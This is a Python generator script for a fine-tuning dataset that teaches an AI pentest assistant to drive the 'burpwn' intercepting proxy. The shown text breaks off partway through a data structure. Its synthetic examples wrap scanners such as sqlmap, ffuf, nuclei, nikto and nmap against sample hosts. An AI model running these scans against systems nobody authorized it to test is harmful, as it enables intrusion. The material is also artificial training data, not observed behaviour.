#!/usr/bin/env python3
"""Deterministic generator for the burpwn LLM fine-tuning dataset.

This script is the *source of truth* for the dataset files. It emits one JSON
object per line. Every command name, flag, JSON envelope shape and MCP tool
name encoded here was verified against the real ``burpwn`` debug binary
(``target/debug/burpwn``) and the MCP server's typed parameter structs /
handlers (``crates/burpwn-mcp/src/{params,server,handlers}.rs``) on
2026-06-13 by actually running the binary and capturing the ``{ok,data,error}``
envelopes (see README.md "How accuracy was grounded").

Two example *styles* are produced, distinguished by the top-level ``"style"``
key on every record (and mirrored in the system prompt):

* ``"cli"``  — chat-format SFT examples. The user states a pentest goal in
  natural language; the assistant replies with the correct ``burpwn`` command(s),
  a short rationale, and (where useful) an interpretation of the JSON envelope.
  Conversations may be single-shot (system/user/assistant) or **multi-turn**
  (alternating user/assistant), always ending on an assistant turn.

* ``"mcp"``  — tool-calling examples (OpenAI-compatible ``tool_calls`` shape).
  ``system → user → assistant(tool_calls) → tool(result) → assistant(final)``,
  and multi-turn variants chaining several call/result/interpret triples.

Usage::

    python generate.py                       # write the split + combined files
    python generate.py --stdout              # emit the combined dataset to stdout
    python generate.py --target 3000         # aim for ~N examples (knob)
    python generate.py --seed 7              # reproducible shuffle seed
    python generate.py --validate            # validate ./dataset.jsonl
    python generate.py --validate FILE       # validate a specific file ('-'=stdin)

The generator is fully deterministic: no network, stdlib only, a fixed default
seed, and a stable emission order — so regeneration is byte-identical on re-run.

CRITICAL grounding facts (CLI and MCP envelopes DIFFER — do not conflate):

  CLI ``--json`` wraps everything in ``{ok,data,error}``.
    * ``req list``  → data is a BARE ARRAY of flow rows (id, authority, method,
      path, status, protocol, scheme, dst_ip, dst_port, sni, intercepted,
      ts_start, ts_end, workspace_id).
    * ``req show``  → data is a flow-detail object: id, protocol, scheme,
      dst_ip, dst_port, sni, intercepted, exec_id, client_addr, workspace_id,
      request{method,authority,path,http_version,headers,body},
      response{status,http_version,headers,body,timing_ms}. ``--raw`` adds
      verbatim head+body to that text output.
    * ``req search`` → data {flow_ids:[...]}.
    * ``req replay`` → data {response:"HTTP/1.1 200 OK\\r\\n..."} (a STRING; no
      separate status field).
    * ``tag add``   → data {flow_id, name, tag_id}.
    * ``note add``  → data {flow_id, note_id}.
    * ``workspace new`` → data {id, name}; ``workspace list`` → BARE ARRAY.
    * ``match-replace add`` → data {id}; ``match-replace list`` → BARE ARRAY of
      {id,scope,match_kind,pattern,replacement,on_request,enabled}.
    * ``match-replace rm|enable|disable`` are STILL not supported at runtime —
      the subcommands parse but error: "match-replace rm/enable/disable are not
      yet supported: the store writer exposes only add + list for rules".
    * ``session new`` → {name}; ``session use`` → {active}; ``session rm`` →
      {removed}; ``session list`` → {active, sessions:[...]}.
    * ``intercept enable/disable`` → {type:"Ack"}; ``intercept list`` →
      {type:"Intercepts",items:[...]}; ``intercept await`` →
      {type:"Pending",item:{...}} or {type:"Pending",item:null} on timeout;
      ``intercept forward/drop`` → {type:"Resolved",found:bool}. (The CLI
      serializes the daemon's ControlResponse enum directly, hence "type".)
    * ``exec --json`` writes {exit_code, exec_id, captured_request_ids} to FD 3.
    * ``export pcap`` → {ok:false, error:"pcap export is not yet implemented
      (use `export har`)"}.
    * ``req show 999`` (missing) → plain text "burpwn: no such flow: 999".
    * tag/note on a non-existent flow → sqlite FOREIGN KEY error.

  MCP tool results (the handlers wrap differently — NO {ok,data,error}, NO
  "type" tag):
    * session_list → {sessions, active}; session_current → {active, db_exists}.
    * req_list → {flows:[...], count:N}; req_show → flow-detail object (raw=true
      adds raw_request/raw_response); req_search → {flow_ids:[...]}.
    * workspace_list → {workspaces:[...]}; tag_list → {tags:[...]};
      match_replace_list → {rules:[...]}.
    * match_replace_add → {id}; tag_add → {tag_id}; note_add → {note_id};
      workspace_new → {workspace_id}.
    * intercept_enable/disable → {ok:true}; intercept_list → {intercepts:[...]};
      await_intercept → {pending:true, intercept:{id,kind,host,method,path}} or
      {pending:false}; intercept_forward/drop → {found:bool}.
    * exec → {exit_code, captured_request_ids, exec_id}.
    * any intercept tool with no daemon → error string starting "no burpwn proxy
      daemon answering ...".
  MCP arg names: req_search.query, req_show.{id,raw}, tag_add.{flow_id,name,color?},
    note_add.{flow_id,body}, workspace_new.name, match_replace_add.{scope,kind,
    pattern,replacement,on_request}, await_intercept.timeout_secs,
    intercept_forward.{id,set_headers:[{name,value}],set_body?}, intercept_drop.id,
    exec.{argv:[...],workspace?(name string),timeout_secs?}.
"""

from __future__ import annotations

import argparse
import hashlib
import json
import os
import random
import sys
from typing import Any, Iterable

# --------------------------------------------------------------------------- #
# Schema + system prompts.
# --------------------------------------------------------------------------- #

SCHEMA_VERSION = "2.1"

SYSTEM_CLI = (
    "You are a web-application penetration-testing assistant that drives "
    "burpwn, a transparent intercepting proxy and rootless sandbox for Linux. "
    "`burpwn exec -- <cmd>` runs a command inside a user+network namespace "
    "whose entire network egress is forced through burpwn's MITM proxy; every "
    "request/response is captured to a per-session SQLite store and can be "
    "listed, searched, inspected, replayed (Repeater), or intercepted live. "
    "Pass the global `--json` flag to get the machine-readable "
    "`{ok, data, error}` envelope. Respond with the exact burpwn command(s) to "
    "run and a brief rationale; interpret JSON output when shown. Only operate "
    "against systems you are authorized to test."
)

SYSTEM_MCP = (
    "You are a web-application penetration-testing assistant connected to the "
    "burpwn MCP server (stdio). burpwn is a transparent intercepting proxy and "
    "rootless sandbox; `exec` runs a command in a namespace whose traffic is "
    "captured to a per-session store, and the other tools query, replay and "
    "intercept those flows. Call the appropriate burpwn MCP tool with correct "
    "JSON arguments to accomplish the user's goal, then interpret the result. "
    "Only operate against systems you are authorized to test."
)

SYSTEM_SHELL = (
    "You are a web-application penetration-testing assistant that drives burpwn "
    "from a shell, running every command with the `Bash` tool. burpwn is a "
    "transparent intercepting proxy + rootless sandbox: `burpwn exec -- <cmd>` "
    "runs <cmd> in a user+network namespace whose entire network egress is forced "
    "through burpwn's MITM proxy, so each request/response is captured (HTTPS "
    "decrypted) to a per-session SQLite store you can then list, search, inspect, "
    "replay (Repeater) and intercept. Create a named session first, route every "
    "target-facing command through `burpwn exec`, then query the captures with "
    "`burpwn req …` (pass the global `--json` flag for machine-readable output: "
    "`{ok,data,error}`, except `req list`/`workspace list`/`match-replace list` "
    "which return bare arrays). Your own non-target commands need not be wrapped — "
    "and the assistant's own LLM traffic is never captured by construction. Only "
    "operate against systems you are authorized to test."
)

# The shell/Bash tool an agent uses to run burpwn from a CLI session (the tool
# name Claude Code exposes and that burpwn's PreToolUse hook matches).
SHELL_TOOL_NAME = "Bash"

# The 19 MCP tools exposed by `burpwn mcp` (verified against server.rs).
MCP_TOOL_NAMES = {
    "session_list",
    "session_current",
    "req_list",
    "req_show",
    "req_search",
    "workspace_list",
    "workspace_new",
    "tag_list",
    "tag_add",
    "note_add",
    "match_replace_list",
    "match_replace_add",
    "intercept_enable",
    "intercept_disable",
    "intercept_list",
    "await_intercept",
    "intercept_forward",
    "intercept_drop",
    "exec",
}

# Known CLI tokens (subcommands + flags) for the lenient command linter.
KNOWN_CLI_SUBCOMMANDS = {
    "doctor", "init", "ca", "session", "exec", "req", "intercept",
    "match-replace", "workspace", "tag", "note", "export",
    "init", "list", "show", "search", "replay", "new", "use", "rm",
    "enable", "disable", "await", "forward", "drop", "add", "har", "pcap",
    "export",
}
KNOWN_CLI_FLAGS = {
    "--json", "-g", "--global", "--agent", "--name", "--workspace",
    "--timeout", "--session", "--host", "--status", "--method", "--protocol",
    "--port", "--limit", "--offset", "--raw", "--set-header", "--set-body",
    "--on", "-o", "--output", "-h", "--help", "-V", "--version",
}

# Tools the engine commonly drives via `exec` (the sandboxed pentest tooling).
EXEC_TOOLS = {
    "curl", "httpie", "http", "wget", "ffuf", "nuclei", "sqlmap", "nmap",
    "nikto", "gobuster", "katana", "python3", "python", "feroxbuster", "dirb",
    "ffuf", "amass", "subfinder", "httpx", "wpscan",
}


# --------------------------------------------------------------------------- #
# Record builders.
# --------------------------------------------------------------------------- #


def cli_example(
    *,
    tags: list[str],
    turns: list[tuple[str, str]],
    system: str = SYSTEM_CLI,
) -> dict[str, Any]:
    """Build a CLI-style chat record from (role, content) turns.

    ``turns`` is a list of (role, content) pairs for everything after the system
    message: it must alternate user/assistant starting with user and ending with
    assistant (enforced by the validator).
    """
    messages: list[dict[str, Any]] = [{"role": "system", "content": system}]
    for role, content in turns:
        messages.append({"role": role, "content": content})
    return {
        "schema_version": SCHEMA_VERSION,
        "style": "cli",
        "tags": tags,
        "messages": messages,
    }


def _tool_call(call_id: str, name: str, args: dict[str, Any]) -> dict[str, Any]:
    return {
        "id": call_id,
        "type": "function",
        "function": {"name": name, "arguments": json.dumps(args, sort_keys=True)},
    }


def mcp_example(
    *,
    tags: list[str],
    user: str,
    steps: list[dict[str, Any]],
    system: str = SYSTEM_MCP,
) -> dict[str, Any]:
    """Build an MCP tool-calling record.

    ``steps`` is a list of dicts, each describing one tool round:
        {"preamble": str, "tool": name, "args": {...}, "result": <json>,
         "final": str}
    The final ``final`` text of the LAST step is the closing assistant turn.
    Intermediate steps' ``final`` becomes an assistant turn between tool rounds
    (a multi-turn conversation). Call ids are assigned deterministically.
    """
    messages: list[dict[str, Any]] = [
        {"role": "system", "content": system},
        {"role": "user", "content": user},
    ]
    n = len(steps)
    for i, step in enumerate(steps):
        cid = f"call_{i + 1}"
        messages.append(
            {
                "role": "assistant",
                "content": step.get("preamble", ""),
                "tool_calls": [_tool_call(cid, step["tool"], step["args"])],
            }
        )
        messages.append(
            {
                "role": "tool",
                "tool_call_id": cid,
                "name": step["tool"],
                "content": json.dumps(step["result"], sort_keys=True),
            }
        )
        # Each step closes with an assistant interpretation. For non-final steps
        # this is an intermediate assistant turn; for the final step it closes
        # the conversation.
        messages.append({"role": "assistant", "content": step["final"]})
        _ = (i, n)
    return {
        "schema_version": SCHEMA_VERSION,
        "style": "mcp",
        "tags": tags,
        "messages": messages,
    }


def _agentic_record(
    *,
    style: str,
    tags: list[str],
    exchanges: list[dict[str, Any]],
    system: str,
) -> dict[str, Any]:
    """Build a tool-calling record as a sequence of multi-turn ``exchanges``.

    Each exchange is ``{"user": str, "steps": [step, ...]}`` and expands to:
    ``user → (assistant(tool_calls=[one call]) → tool(result) → assistant(interp))+``.
    Chaining several exchanges yields a genuine multi-turn conversation (several
    *user* turns, each driving one or more tool rounds).

    ``style`` selects the tool dialect:

    * ``"shell"`` — each step is ``{"preamble", "command", "result", "interp"}``;
      the tool call is a ``Bash`` call ``{"command": …}`` (exactly how an agent
      runs burpwn from a CLI session / under the PreToolUse hook), and the tool
      ``result`` is the command's raw stdout *string*.
    * ``"mcp"`` — each step is ``{"preamble", "tool", "args", "result", "interp"}``;
      the tool call targets an MCP tool with JSON ``args`` and the ``result`` is a
      JSON-encodable object (serialized to a string, like ``mcp_example``).
    """
    messages: list[dict[str, Any]] = [{"role": "system", "content": system}]
    cid = 0
    for ex in exchanges:
        messages.append({"role": "user", "content": ex["user"]})
        for step in ex["steps"]:
            cid += 1
            call_id = f"call_{cid}"
            if style == "shell":
                name = SHELL_TOOL_NAME
                args: dict[str, Any] = {"command": step["command"]}
                result_content = step["result"]  # raw stdout string
            else:
                name = step["tool"]
                args = step["args"]
                result_content = json.dumps(step["result"], sort_keys=True)
            messages.append(
                {
                    "role": "assistant",
                    "content": step.get("preamble", ""),
                    "tool_calls": [_tool_call(call_id, name, args)],
                }
            )
            messages.append(
                {
                    "role": "tool",
                    "tool_call_id": call_id,
                    "name": name,
                    "content": result_content,
                }
            )
            messages.append({"role": "assistant", "content": step["interp"]})
    return {
        "schema_version": SCHEMA_VERSION,
        "style": style,
        "tags": tags,
        "messages": messages,
    }


def shell_example(
    *, tags: list[str], exchanges: list[dict[str, Any]], system: str = SYSTEM_SHELL
) -> dict[str, Any]:
    """A ``Bash``-tool-call record driving burpwn from a CLI session (single- or
    multi-turn). See [`_agentic_record`]."""
    return _agentic_record(style="shell", tags=tags, exchanges=exchanges, system=system)


def mcp_conversation(
    *, tags: list[str], exchanges: list[dict[str, Any]], system: str = SYSTEM_MCP
) -> dict[str, Any]:
    """A multi-turn MCP record: several *user* turns, each driving one or more MCP
    tool rounds. (``mcp_example`` is the single-user-turn form.)"""
    return _agentic_record(style="mcp", tags=tags, exchanges=exchanges, system=system)


# --------------------------------------------------------------------------- #
# Target / scenario parameter space — realistic, not combinatorial padding.
# --------------------------------------------------------------------------- #


class Target:
    def __init__(
        self,
        key: str,
        host: str,
        scheme: str = "https",
        port: int = 443,
        kind: str = "webapp",
        dst_ip: str = "203.0.113.10",
        protocol: str = "h2",
        api_host: str | None = None,
        desc: str = "",
    ) -> None:
        self.key = key
        self.host = host
        self.scheme = scheme
        self.port = port
        self.kind = kind  # webapp | rest | graphql | spa | internal
        self.dst_ip = dst_ip
        self.protocol = protocol
        self.api_host = api_host or host
        self.desc = desc

    @property
    def base(self) -> str:
        if (self.scheme == "https" and self.port == 443) or (
            self.scheme == "http" and self.port == 80
        ):
            return f"{self.scheme}://{self.host}"
        return f"{self.scheme}://{self.host}:{self.port}"


TARGETS = [
    Target("juiceshop", "juice-shop.local", "https", 443, "spa",
           dst_ip="10.10.0.21", protocol="h2",
           desc="the OWASP Juice Shop SPA"),
    Target("dvwa", "dvwa.local", "http", 80, "webapp",
           dst_ip="10.10.0.22", protocol="h1",
           desc="a DVWA instance"),
    Target("restapi", "api.shopwave.io", "https", 443, "rest",
           dst_ip="198.51.100.30", protocol="h2",
           desc="a JSON REST API"),
    Target("graphql", "gql.acme-corp.com", "https", 443, "graphql",
           dst_ip="198.51.100.41", protocol="h2",
           desc="a GraphQL API"),
    Target("spa", "app.fintrack.dev", "https", 443, "spa",
           dst_ip="203.0.113.55", protocol="h2",
           desc="a React SPA + backend API"),
    Target("internal", "intranet.corp.lan", "http", 8080, "internal",
           dst_ip="10.0.5.12", protocol="h1",
           desc="an internal intranet host"),
    Target("altport", "staging.example.com", "https", 8443, "webapp",
           dst_ip="192.0.2.77", protocol="h2",
           desc="a staging site on a non-standard port"),
    Target("blog", "blog.contoso.example", "https", 443, "webapp",
           dst_ip="203.0.113.88", protocol="h2",
           desc="a WordPress blog"),
    Target("ecom", "shop.northwind.example", "https", 443, "webapp",
           dst_ip="198.51.100.66", protocol="h2",
           desc="an e-commerce storefront"),
    Target("auth", "auth.fintrack.dev", "https", 443, "rest",
           dst_ip="203.0.113.56", protocol="h2",
           desc="an OAuth/identity service"),
    Target("admin", "admin.intranet.corp.lan", "http", 8080, "internal",
           dst_ip="10.0.5.13", protocol="h1",
           desc="an internal admin panel"),
    Target("mobapi", "mobile-api.shopwave.io", "https", 8443, "rest",
           dst_ip="198.51.100.31", protocol="h2",
           desc="a mobile-app backend API on a non-standard port"),
    Target("legacy", "legacy.acme-corp.com", "http", 80, "webapp",
           dst_ip="192.0.2.40", protocol="h1",
           desc="a legacy HTTP-only site"),
    Target("gqlpub", "api.devhub.example", "https", 443, "graphql",
           dst_ip="203.0.113.99", protocol="h2",
           desc="a public GraphQL endpoint"),
    Target("ip", "192.0.2.123", "http", 80, "internal",
           dst_ip="192.0.2.123", protocol="h1",
           desc="a bare-IP internal service"),
]


def _t(key: str) -> Target:
    for t in TARGETS:
        if t.key == key:
            return t
    raise KeyError(key)


# --------------------------------------------------------------------------- #
# Family helpers — each returns a list of records. Families are parameterized
# over the target space and over phrasing variants for genuine diversity.
# --------------------------------------------------------------------------- #


def fam_setup() -> list[dict[str, Any]]:
    out: list[dict[str, Any]] = []

    doctor_ready = (
        '{"ok":true,"data":{"bwrap_present":true,"ca_present":true,'
        '"ip_present":true,"missing":"","nft_present":true,"ready":true,'
        '"subuid_present":true,"userns_enabled":true},"error":null}'
    )

    # doctor phrasing variants
    for phrasing in [
        "Before I start, can you check my machine is ready to run burpwn?",
        "Is my host set up correctly for burpwn's sandbox?",
        "Run burpwn's prerequisite check and tell me if anything is missing.",
        "Sanity-check the environment before we begin the engagement.",
    ]:
        out.append(
            cli_example(
                tags=["setup", "doctor"],
                turns=[
                    (
                        "user",
                        phrasing,
                    ),
                    (
                        "assistant",
                        "Run the prerequisite probe:\n\n```\nburpwn --json doctor\n```\n\n"
                        "It checks the unprivileged user namespace, the subuid entry, "
                        "`bwrap`, `nft`, `ip`, and whether the CA exists. A ready host "
                        f"returns:\n\n```json\n{doctor_ready}\n```\n\n"
                        "If `ready` is `false`, look at `ca_present` (fix with "
                        "`burpwn ca init`) and any `*_present` field that is `false`.",
                    ),
                ],
            )
        )

    # doctor interpret: each missing piece
    missing_cases = [
        ("ca_present", "burpwn ca init", "generate the root CA"),
        ("userns_enabled", "sysctl kernel.unprivileged_userns_clone=1 (as root)",
         "enable unprivileged user namespaces"),
        ("nft_present", "install nftables (e.g. `dnf install nftables`)",
         "install the `nft` binary"),
        ("bwrap_present", "install bubblewrap (e.g. `dnf install bubblewrap`)",
         "install `bwrap`"),
        ("subuid_present", "add a subuid range for your user in /etc/subuid",
         "add the subuid mapping"),
    ]
    for field, fix, human in missing_cases:
        fields = {
            "bwrap_present": True, "ca_present": True, "ip_present": True,
            "nft_present": True, "subuid_present": True, "userns_enabled": True,
        }
        fields[field] = False
        env = {
            "ok": True,
            "data": {**fields, "missing": "", "ready": False},
            "error": None,
        }
        out.append(
            cli_example(
                tags=["setup", "doctor", "interpret", "recovery"],
                turns=[
                    (
                        "user",
                        f"`burpwn --json doctor` returned "
                        f"`{json.dumps(env, sort_keys=True)}`. What's wrong?",
                    ),
                    (
                        "assistant",
                        f"`{field}` is `false`, which forces `ready:false`. You need to "
                        f"{human}: {fix}. Then re-run `burpwn --json doctor` and confirm "
                        f"`{field}` and `ready` are both `true`.",
                    ),
                ],
            )
        )

    # ca init / export
    out.append(
        cli_example(
            tags=["setup", "ca"],
            turns=[
                ("user", "Generate the MITM root CA and tell me where it lives."),
                (
                    "assistant",
                    "```\nburpwn ca init\n```\n\nIt is idempotent (creates the CA only "
                    "if absent) and reports the path:\n\n```json\n"
                    '{"ok":true,"data":{"ca_pem":"/home/me/.local/share/burpwn/ca.pem"},'
                    '"error":null}\n```',
                ),
            ],
        )
    )
    out.append(
        cli_example(
            tags=["setup", "ca", "export"],
            turns=[
                ("user", "I need the CA certificate as PEM to trust it in a browser profile."),
                (
                    "assistant",
                    "Print the CA to stdout and redirect it:\n\n```\nburpwn ca export > "
                    "burpwn-ca.pem\n```\n\n`ca export` writes the verbatim PEM "
                    "(`-----BEGIN CERTIFICATE-----` …), not a JSON envelope, so it pipes "
                    "straight into a trust store.",
                ),
            ],
        )
    )
    for agent, agent_id, path in [
        ("claude", "claude-code", "/home/me/.claude/settings.json"),
        ("cursor", "cursor", "/home/me/.cursor/settings.json"),
    ]:
        out.append(
            cli_example(
                tags=["setup", "init", "agent"],
                turns=[
                    (
                        "user",
                        f"Hook burpwn into {agent} so its shell commands run in the sandbox.",
                    ),
                    (
                        "assistant",
                        f"Install the agent hook:\n\n```\nburpwn init --agent {agent}\n```\n\n"
                        "Result:\n\n```json\n"
                        f'{{"ok":true,"data":{{"installed":[{{"action":"Installed",'
                        f'"agent":"{agent_id}","path":"{path}"}}]}},"error":null}}\n```\n\n'
                        "Use `burpwn init -g` instead for a generic global shell hook "
                        "(patches `~/.bashrc` and `~/.zshrc`) that covers any agent.",
                    ),
                ],
            )
        )
    return out


def fam_sessions() -> list[dict[str, Any]]:
    out: list[dict[str, Any]] = []
    names = ["acme", "shopwave", "fintrack", "redteam-q3", "client-x"]
    for name in names:
        out.append(
            cli_example(
                tags=["session", "setup"],
                turns=[
                    (
                        "user",
                        f"Start a fresh session for the {name} engagement and make it active.",
                    ),
                    (
                        "assistant",
                        "Create it, then switch to it:\n\n"
                        f"```\nburpwn session new --name {name}\nburpwn session use {name}\n```\n\n"
                        f'`session new` returns `{{"ok":true,"data":{{"name":"{name}"}},'
                        f'"error":null}}` and `session use` confirms with '
                        f'`{{"ok":true,"data":{{"active":"{name}"}},"error":null}}`. All '
                        "subsequent `exec`/`req` use the active session unless you pass "
                        "`--session`.",
                    ),
                ],
            )
        )
    out.append(
        cli_example(
            tags=["session", "list"],
            turns=[
                ("user", "Which burpwn sessions exist and which one am I on?"),
                (
                    "assistant",
                    "```\nburpwn --json session list\n```\n\nThe active session is in "
                    '`data.active`:\n\n```json\n{"ok":true,"data":{"active":"acme",'
                    '"sessions":["default","acme","shopwave"]},"error":null}\n```',
                ),
            ],
        )
    )
    out.append(
        cli_example(
            tags=["session", "rm"],
            turns=[
                ("user", "Delete the old 'probe' session and its database."),
                (
                    "assistant",
                    "```\nburpwn session rm probe\n```\n\nReturns "
                    '`{"ok":true,"data":{"removed":"probe"},"error":null}` and deletes the '
                    "session's SQLite store and runtime files. Switch away first if it is "
                    "the active session.",
                ),
            ],
        )
    )
    return out


def fam_exec_recon() -> list[dict[str, Any]]:
    """Recon via `exec` across targets and tools — the heart of the dataset."""
    out: list[dict[str, Any]] = []

    # curl fetch (single + interpret) across targets
    for t in TARGETS:
        out.append(
            cli_example(
                tags=["exec", "recon", "curl", t.key],
                turns=[
                    (
                        "user",
                        f"Fetch the {t.host} homepage through the proxy so it gets captured.",
                    ),
                    (
                        "assistant",
                        f"```\nburpwn exec -- curl -s {t.base}/\n```\n\n"
                        "Everything after `--` runs inside the sandbox; its network is "
                        "forced through burpwn's MITM proxy, so the request/response (plus "
                        "the DNS lookups) land in the session store. The command's own "
                        "stdout passes through untouched. Add `--json` to also get the exec "
                        "envelope `{exit_code, exec_id, captured_request_ids}` on fd 3.",
                    ),
                ],
            )
        )

    # exec envelope interpret variants
    for ids, t in [([12, 13, 14], _t("juiceshop")), ([50, 51, 52], _t("restapi")),
                   ([7, 8, 9], _t("dvwa"))]:
        env = {
            "ok": True,
            "data": {
                "captured_request_ids": ids,
                "exec_id": f"exec-3608212-0-178136375962129707{ids[0]}",
                "exit_code": 0,
            },
            "error": None,
        }
        out.append(
            cli_example(
                tags=["exec", "recon", "envelope", "interpret", t.key],
                turns=[
                    (
                        "user",
                        f"I ran `burpwn --json exec -- curl -s -o /dev/null {t.base}/` "
                        f"and fd 3 gave me `{json.dumps(env, sort_keys=True)}`. What now?",
                    ),
                    (
                        "assistant",
                        f"Clean exit (`exit_code:0`); burpwn captured {len(ids)} flows this "
                        f"run: ids {', '.join(map(str, ids))} (typically the A/AAAA DNS "
                        f"queries plus the HTTP request). Inspect the HTTP one — usually the "
                        f"highest id — with `burpwn req show {ids[-1]}`. The DNS ones are the "
                        f"`QUERY` flows. Correlate the whole run later via the `exec_id`.",
                    ),
                ],
            )
        )

    # tool-specific recon scenarios
    tool_scenarios = [
        ("ffuf", "{base}/FUZZ", "ffuf -u {base}/FUZZ -w wordlist.txt -mc 200,301,302,403",
         600, "content discovery",
         "Every probe ffuf makes is captured, so afterwards "
         "`burpwn req list --host {host} --status 200` reviews the hits with their real "
         "responses."),
        ("gobuster", "{base}", "gobuster dir -u {base} -w wordlist.txt",
         600, "directory brute-forcing",
         "Each request gobuster sends is captured; filter the hits with "
         "`burpwn req list --host {host}`."),
        ("feroxbuster", "{base}", "feroxbuster -u {base} -w wordlist.txt --silent",
         600, "recursive content discovery",
         "Review the recursion's hits with `burpwn req list --host {host} --status 200`."),
        ("nuclei", "{base}", "nuclei -u {base} -silent",
         300, "a templated vuln scan",
         "Use `burpwn req list --host {host}` to see exactly which requests nuclei sent "
         "and the live responses."),
        ("nikto", "{base}", "nikto -h {base}",
         600, "a Nikto web-server scan",
         "Nikto's probes are all captured; `burpwn req search` the responses for the "
         "findings it flags."),
        ("katana", "{base}", "katana -u {base} -silent",
         300, "crawling",
         "The crawl's flows are captured; `burpwn req list --host {host}` to triage the "
         "discovered endpoints."),
        ("nmap", "{host}", "nmap -sT -Pn {host}",
         300, "a TCP connect port scan",
         "Note nmap's raw connects appear as `rawtcp`/`dns` flows, not HTTP — review with "
         "`burpwn req list --protocol rawtcp --host {host}`."),
        ("wpscan", "{base}", "wpscan --url {base} --no-update",
         600, "a WordPress scan",
         "WPScan's enumeration requests are captured under the session for later review."),
    ]
    for tool, _urlpat, cmdpat, to, desc, note in tool_scenarios:
        for t in (TARGETS[0], TARGETS[2], TARGETS[5]):
            cmd = cmdpat.format(base=t.base, host=t.host)
            note_r = note.format(host=t.host)
            out.append(
                cli_example(
                    tags=["exec", "recon", "tool", tool, t.key],
                    turns=[
                        (
                            "user",
                            f"Run {tool} {desc} against {t.host} through burpwn.",
                        ),
                        (
                            "assistant",
                            f"Wrap the whole {tool} invocation after `--` and give it a "
                            f"generous timeout since it's long-running:\n\n"
                            f"```\nburpwn exec --timeout {to} -- {cmd}\n```\n\n{note_r}",
                        ),
                    ],
                )
            )

    # httpie / wget / python requests variants
    out.append(
        cli_example(
            tags=["exec", "recon", "httpie", "restapi"],
            turns=[
                ("user", "Use HTTPie to POST a login to the shopwave API under the sandbox."),
                (
                    "assistant",
                    "```\nburpwn exec -- http POST https://api.shopwave.io/v1/login "
                    "email=user@x.io password=hunter2\n```\n\nHTTPie's request and the JSON "
                    "response are captured; `burpwn req list --host api.shopwave.io "
                    "--method POST` then `burpwn req show <id>` to read the token in the "
                    "response.",
                ),
            ],
        )
    )
    out.append(
        cli_example(
            tags=["exec", "recon", "python", "script"],
            turns=[
                ("user", "Run my Python requests script that hits the API; capture its traffic."),
                (
                    "assistant",
                    "Just run the interpreter under `exec` — the whole process tree's "
                    "egress is captured:\n\n```\nburpwn exec --timeout 120 -- python3 "
                    "probe.py\n```\n\nEvery `requests` call the script makes is MITM'd into "
                    "the store; afterwards `burpwn req list` shows them newest-first.",
                ),
            ],
        )
    )
    out.append(
        cli_example(
            tags=["exec", "session-override", "sqlmap"],
            turns=[
                (
                    "user",
                    "Run a sqlmap probe but attribute it to my 'acme' session, not "
                    "whatever's active.",
                ),
                (
                    "assistant",
                    "Pin the session with `--session` (it follows the `exec` token, before "
                    "`--`):\n\n```\nburpwn exec --session acme --timeout 900 -- sqlmap -u "
                    '"https://acme.com/item?id=1" --batch\n```\n\nAll of sqlmap\'s payloads '
                    "are captured under `acme` for later `req list`/`req search`.",
                ),
            ],
        )
    )
    out.append(
        cli_example(
            tags=["exec", "recon", "workspace"],
            turns=[
                ("user", "Crawl the SPA but keep its flows in their own bucket."),
                (
                    "assistant",
                    "Create a workspace and attribute the exec's flows to it by **id**:\n\n"
                    "```\nburpwn workspace new crawl\nburpwn exec --workspace 2 -- katana -u "
                    "https://app.fintrack.dev -silent\n```\n\n`workspace new crawl` returns "
                    'the id (e.g. `{"ok":true,"data":{"id":2,"name":"crawl"},"error":null}`); '
                    "pass that id to `--workspace`. Later filter with "
                    "`burpwn req list --workspace 2`.",
                ),
            ],
        )
    )
    return out


def fam_req_list() -> list[dict[str, Any]]:
    out: list[dict[str, Any]] = []

    def flow_row(fid: int, t: Target, method: str, path: str, status: int) -> dict[str, Any]:
        return {
            "authority": t.host,
            "dst_ip": t.dst_ip,
            "dst_port": t.port,
            "id": fid,
            "intercepted": False,
            "method": method,
            "path": path,
            "protocol": t.protocol,
            "scheme": t.scheme,
            "sni": t.host if t.scheme == "https" else None,
            "status": status,
            "ts_end": 1781363726726,
            "ts_start": 1781363726697,
            "workspace_id": 1,
        }

    t = _t("restapi")
    out.append(
        cli_example(
            tags=["req", "list", "interpret"],
            turns=[
                ("user", "Show me the most recent captured flows."),
                (
                    "assistant",
                    "```\nburpwn --json req list --limit 20\n```\n\nFlows come back "
                    "newest-first as a bare array under `data`. Each row looks like:\n\n"
                    "```json\n" + json.dumps(flow_row(41, t, "GET", "/v1/me", 200),
                                             sort_keys=True) + "\n```",
                ),
            ],
        )
    )
    # filter combinations across targets
    filter_cases = [
        ("--host {host} --method GET --status 200",
         "List only the successful GET requests to {host}.",
         "`--host` is a substring match against host/SNI/dst-ip; `--method`/`--status` are "
         "exact. Add `--json` for the array, or `--limit`/`--offset` to page."),
        ("--status 500",
         "Did anything 500? Show me server errors.",
         "`--status` is an exact match; 500s often reveal stack traces worth a "
         "`burpwn req show <id> --raw`."),
        ("--method POST",
         "Show me every POST that was captured.",
         "POST bodies are where injection/auth payloads live; pair with "
         "`burpwn req search` to find specific parameters."),
        ("--port 8443",
         "Show flows that went to the non-standard port 8443.",
         "`--port` is an exact match against `dst_port`; combine with `--host` to narrow."),
        ("--protocol ws",
         "Did the app open any websockets?",
         "Valid `--protocol` values are `h1`, `h2`, `ws`, `dns`, `rawtcp`, `tls-passthru`."),
        ("--protocol dns",
         "Show me the DNS lookups the sandbox made.",
         "DNS flows have `method:\"QUERY\"` and paths like `host./A` and `host./AAAA`."),
        ("--workspace 3",
         "Show only the flows in workspace 3.",
         "`--workspace` takes the numeric id from `workspace new`/`workspace list`."),
        ("--limit 50 --offset 50",
         "There are hundreds of flows — give me rows 50 to 100.",
         "Results are newest-first, so `--offset 50` skips the 50 newest and `--limit 50` "
         "returns the next page."),
    ]
    for flags, ask, note in filter_cases:
        t = _t("restapi")
        out.append(
            cli_example(
                tags=["req", "list", "filter"],
                turns=[
                    ("user", ask.format(host=t.host)),
                    (
                        "assistant",
                        f"```\nburpwn req list {flags.format(host=t.host)}\n```\n\n"
                        f"{note}",
                    ),
                ],
            )
        )
    return out


def fam_req_show_search() -> list[dict[str, Any]]:
    out: list[dict[str, Any]] = []

    show_detail = {
        "ok": True,
        "data": {
            "client_addr": "10.99.0.1:41516",
            "dst_ip": "198.51.100.30",
            "dst_port": 443,
            "exec_id": None,
            "id": 41,
            "intercepted": False,
            "protocol": "h2",
            "request": {
                "authority": "api.shopwave.io",
                "body": "",
                "headers": "authorization: Bearer eyJ...\r\naccept: application/json\r\n",
                "http_version": "HTTP/2.0",
                "method": "GET",
                "path": "/v1/me",
            },
            "response": {
                "body": '{"id":1001,"role":"user","email":"a@x.io"}',
